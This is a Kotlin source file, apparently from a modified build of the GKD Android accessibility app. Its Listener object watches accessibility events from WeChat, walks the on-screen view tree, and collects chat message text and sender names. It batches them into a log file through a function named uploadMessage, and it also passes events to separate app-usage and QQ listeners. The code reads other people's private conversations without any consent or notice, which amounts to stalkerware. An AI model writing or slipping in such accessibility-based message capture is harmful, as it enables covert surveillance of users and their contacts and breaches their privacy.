package li.songe.gkd.a11y

import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.blankj.utilcode.util.LogUtils
import li.songe.gkd.service.A11yService
import li.songe.gkd.a11y.utils.appListenerFile
import li.songe.gkd.a11y.utils.appendTime

object Listener {
    private val TAG = "Listener"
    private var lastRead = System.currentTimeMillis()
    private var user = ""
    private val messageList = ArrayList<String>()
    private val allMessageList = ArrayList<String>()
    private val sleepDefault = 5 * 1000
    private val friendSleep = 1000 * 10 * 2
    private var sleep = sleepDefault
    private var uploading = false

    fun onAccessibilityEvent(
        event: AccessibilityEvent?,
    ) {
        val rootInActiveWindow = A11yService.instance?.safeActiveWindow
        AppUseListener.onAccessibilityEvent(event, rootInActiveWindow)
        QListener.onAccessibilityEvent(event, rootInActiveWindow)

        if (event?.packageName.toString() != "com.tencent.mm") return
        if ((System.currentTimeMillis() - lastRead) < sleep) return
        if (messageList.size > 100 && !uploading) {
            allMessageList.addAll(messageList)
            uploadMessage()
            if (allMessageList.size > 100 * 1000) allMessageList.clear()
        }
        rootInActiveWindow?.let {
            lastRead = System.currentTimeMillis()
            sleep = sleepDefault
            Log.d(TAG, "wechat start")
            findAll(it, 0)
            it.printNodeInfo()
        }
    }

    private fun uploadMessage() {
        uploading = true
        var liveMessage = ""
        messageList.map { liveMessage = "$liveMessage\n$it" }
        messageList.clear()
        appListenerFile.appendText(liveMessage)
        appListenerFile.appendTime()
        uploading = false
    }

    private fun findAll(node: AccessibilityNodeInfo, level: Int) {
        if (level > 25) return
        for (i in 0 until node.childCount) {
            val node1 = node.getChild(i) ?: return
            var className: String? = null
            try {
                className = node1.className.toString() + ""
            } catch (e: Exception) {
                e.printStackTrace()
            }
            if (className == "android.widget.TextView") {
                val message = node1.text?.toString() ?: ""
                if (message == "浮窗") return
                if (message == "朋友圈") {
                    sleep = friendSleep
                    return
                }

                addMessage(message)
            } else if (className == "android.widget.ImageView") {
                val cuser = node1.contentDescription?.toString() ?: ""
                if (user != cuser) {
                    messageList.add(cuser)
                    Log.d(TAG, cuser)
                    user = cuser
                }
            } else if (node1.childCount > 0) {
                findAll(node1, level + 1)
            }
        }
    }

    private fun addMessage(message: String) {
        if (messageList.contains(message) || allMessageList.contains(message)) {
            return
        }
        messageList.add(message)
    }

    fun AccessibilityNodeInfo?.printNodeInfo(prefix: String = "", isLast: Boolean = false) {
        val node = this ?: return
        val nodeWrapper = NodeWrapper(
            text = node.text?.toString(),
            id = node.viewIdResourceName,
            className = node.className.toString(),
            description = node.contentDescription?.toString(),
            isClickable = node.isClickable,
            isScrollable = node.isScrollable,
            isEditable = node.isEditable,
            nodeInfo = node
        )
        val marker = if (isLast) """\--- """ else "+--- "
        val currentPrefix = "$prefix$marker"
        Log.d("printNodeInfo", currentPrefix + nodeWrapper.toString())

        val size = node.childCount
        if (size > 0) {
            val childPrefix = prefix + if (isLast) "  " else "|  "
            val lastChildIndex = size - 1
            for (index in 0 until size) {
                val isLastChild = index == lastChildIndex
                node.getChild(index).printNodeInfo(childPrefix, isLastChild)
            }
        }
    }
}

data class NodeWrapper(
    var className: String?,
    var text: String? = null,
    var id: String? = null,
    var description: String? = null,
    var isClickable: Boolean = false,
    var isScrollable: Boolean = false,
    var isEditable: Boolean = false,
    var nodeInfo: AccessibilityNodeInfo? = null
) {
    override fun toString() = "className = $className → text = $text → id = $id → description = $description → isClickable = $isClickable → isScrollable = $isScrollable → isEditable = $isEditable"

}